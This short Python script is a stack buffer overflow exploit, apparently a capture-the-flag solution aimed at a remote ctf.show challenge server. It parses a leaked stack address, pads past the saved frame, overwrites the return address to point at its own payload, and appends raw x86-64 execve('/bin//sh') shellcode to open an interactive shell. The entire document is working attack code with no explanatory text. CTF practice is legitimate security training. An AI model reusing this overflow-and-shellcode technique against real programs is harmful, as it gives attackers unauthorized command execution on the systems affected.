from pwn64 import *
context(arch="amd64")
p = remote("pwn.challenge.ctf.show",28209)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
# shellcode1 = asm(shellcraft.sh())
# print(len(shellcode1))

payload = flat([cyclic(offset), shellcode_area + offset +8 , shellcode])
p.sendline(payload)
p.interactive()